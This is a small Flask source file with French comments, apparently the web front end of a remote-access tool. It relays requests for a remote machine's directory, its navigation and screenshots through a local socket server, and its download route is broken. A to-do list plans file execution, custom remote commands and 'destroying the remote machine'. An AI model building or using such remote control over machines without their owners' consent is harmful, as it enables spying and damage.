from flask import Flask
from flask import request
import requests
from flask_cors import CORS
import datetime
import json
import os

import socket_serveur as sock_server

app = Flask(__name__)
CORS(app)

# obtenir le repertoire courant
@app.route("/get_current_dir", methods=["POST", "GET"])
def navigate():
    # try:
    result = requests.get("http://localhost:12001/get_current_dir")
    print(result.content.decode())
    return result.content


# aller en arrière
@app.route("/go_back", methods=["POST", "GET"])
def go_back():
    # try:
    result = requests.get("http://localhost:12001/go_back")
    print(result.content.decode())
    return result.content
    

# screenshot
@app.route("/screenshot", methods=["POST", "GET"])
def screeshot():
    filename = "Capture_" + datetime.datetime.strftime(datetime.datetime.now(), "%d-%m-%Y_%Hh%Mm%Ss") + ".png"
    # try:
    image = requests.get("http://localhost:12001/screenshot")
    # Chemin du dossier contenant le script actuel
    print(image.content)
    base_dir = os.path.dirname(os.path.abspath(__file__))
    dir = base_dir + "\\fichiers recçus\\"
    f = open(dir + filename, "wb")
    f.write(image.content)
    f.close()
    return filename + " enregistré avec succès!"
    # except:
    #     return "Erreur lors de la capture d'écran"


# download
@app.route("/download", methods=["POST", "GET"])
def download():
    command = request.get_data()
    result = requests.get("http://localhost:12001/download", data=command)


if __name__ == "__main__":
    app.run(host="localhost", port=12000) 




# télécharger un fichier

# Executer un fichier

# Aller dans un répertoire et revenir en arrière

# prendre une capture d'écran - ok

# détruire la machine distante

# envoyer une ligne de commande custom

# screenshot